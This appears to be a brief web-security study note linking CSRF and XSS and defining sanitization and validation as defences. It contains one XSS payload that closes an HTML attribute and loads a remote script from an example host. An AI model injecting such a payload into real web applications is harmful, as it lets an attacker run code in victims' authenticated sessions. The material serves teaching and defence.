CSRF attacks may utilize XSS vulnerabilities to perform certain queries, and API calls on a web application that the victim is currently authenticated to.

```
"><script src=//www.example.com/exploit.js></script>
```
###### **Sanitization** 	
Removing special characters and non-standard characters from user input before displaying it or storing it.
###### **Validation** 	
Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)